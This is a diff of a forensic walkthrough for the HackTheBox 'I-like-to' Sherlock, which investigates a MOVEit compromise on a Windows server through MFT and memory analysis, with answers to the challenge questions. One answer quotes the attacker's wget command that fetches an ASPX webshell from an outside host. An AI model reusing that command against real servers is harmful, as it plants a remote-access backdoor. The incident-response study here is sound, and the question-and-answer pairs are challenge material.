@@ -1,15 +1,13 @@
----
-dg-publish: true
----
-###### Summary: 
+
+### Summary: 
 
 *I-like-to* is one of the first Sherlocks HTB has published. Despite being ranked as easy, it still provides a good learning value for a beginner. While working on this challenge, I have acquainted with MOVEit vulnerability, analysed KAPE artifacts, including MFT file, correlated data with raw hex, and answered relevant questions regarding the exploitation of the vulnerability.
 
-###### Challenge scenario: 
+### Challenge scenario: 
 
 "We have unfortunately been hiding under a rock and do not see the many news articles referencing the recent MOVEit CVE being exploited in the wild. We believe our Windows server may be vulnerable and has recently fallen victim to this compromise. We need to understand this exploit in a bit more detail and confirm the actions of the attacker & retrieve some details, so we can implement them into our SOC environment. We have provided you with a triage of all the necessary artefacts from our compromised Windows server. PS: One of the artifacts is a memory dump, but we forgot to include the vmss file. You might have to go back to basics here..."
 
-###### Walkthrough:
+### Walkthrough:
 
 1. *Name of the ASPX webshell uploaded by the attacker?*
 	I parcelled MFT using MFTCmd and then opened it with TimeLine Explorer. The first question is to find ASPX web shell, I filtered files' extension to .aspx and the first file in the output had missing 0x30 ($Filename information) timestamp which indicates that it was likely uploaded from a different host. 
@@ -71,7 +69,8 @@ dg-publish: true
     Answer: 1234
 
 12. What command was run by the attacker to retrieve the webshell?
-	Answer: wget http://10.255.254.3:9001/move.aspx -OutFile move.aspx
+	
+	Answer: `wget http://10.255.254.3:9001/move.aspx -OutFile move.aspx`
 
 13. *What was the string within the title header of the webshell deployed by the TA?*
 	To find a header I used command `strings "C:\Users\glebas\Desktop\I-like-to-27a787c5.vmem" | Select-String "move.aspx" -Context 20, 20` -- it allows to see 20 lines above and below from the target line (move.aspx) in this case.
